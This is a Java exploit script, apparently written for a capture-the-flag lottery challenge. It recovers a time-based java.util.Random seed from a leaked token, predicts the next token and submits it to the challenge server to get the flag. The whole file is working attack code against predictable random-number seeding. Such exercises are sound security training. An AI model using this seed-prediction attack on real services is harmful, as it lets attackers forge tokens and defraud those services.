import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.*;

public class LoteriaExploitFinal {
    private static final String BASE_URL = "https://r1-ctf-vulnerable.numa.host";
    private static final int MAX_NUMBER = 1_234_000_100;
    private static final int TIME_WINDOW_MS = 5000;

    public static void main(String[] args) throws Exception {
        System.out.println("Iniciando...");

        //Reiniciar estado
        String cookie = resetState();
        long estimatedTime = System.currentTimeMillis();
        System.out.println("Timestamp estimado: " + estimatedTime);

        //Forzar token inválido y obtener t1
        int t1 = getUsedToken(cookie);
        System.out.println("Token usado (t1): " + t1);

        //Buscar semilla correcta
        Long seed = findSeed(t1, estimatedTime);
        if (seed == null) {
            System.out.println("No se encontró una semilla válida");
            return;
        }
        System.out.println("Semilla encontrada: " + seed);

        //Predecir token actual
        Random r = new Random(seed);
        r.nextInt(MAX_NUMBER);
        int t2 = r.nextInt(MAX_NUMBER);
        System.out.println("Token predicho (t2): " + t2);

        //Validar token
        String response = sendCheck(cookie, t2);
        System.out.println("FLAG o éxito detectado:\n" + response);
    }

    private static String resetState() throws Exception {
        HttpURLConnection con = (HttpURLConnection) new URL(BASE_URL + "/reset").openConnection();
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.connect();

        String cookie = con.getHeaderField("Set-Cookie");
        if (cookie == null) throw new RuntimeException("No se recibió cookie tras reset.");

        System.out.println("Reiniciando estado");
        return cookie.split(";")[0];
    }

    private static int getUsedToken(String cookie) throws Exception {
        String html = sendCheck(cookie, 0);
        Pattern p = Pattern.compile("<il>(\\d+)</il>");
        Matcher m = p.matcher(html);
        if (m.find()) return Integer.parseInt(m.group(1));
        throw new RuntimeException("No se pudo extraer el token usado del HTML.");
    }

    private static String sendCheck(String cookie, int token) throws Exception {
        HttpURLConnection con = (HttpURLConnection) new URL(BASE_URL + "/check").openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Cookie", cookie);
        con.setDoOutput(true);
        String body = "number=" + token;
        OutputStream os = con.getOutputStream();
        os.write(body.getBytes());
        os.flush();
        os.close();

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) content.append(inputLine).append("\n");
        in.close();

        return content.toString();
    }

    private static Long findSeed(int t1, long estimatedTime) {
        for (long seed = estimatedTime - TIME_WINDOW_MS; seed <= estimatedTime + TIME_WINDOW_MS; seed++) {
            Random r = new Random(seed);
            if (r.nextInt(MAX_NUMBER) == t1) return seed;
        }
        return null;
    }
}
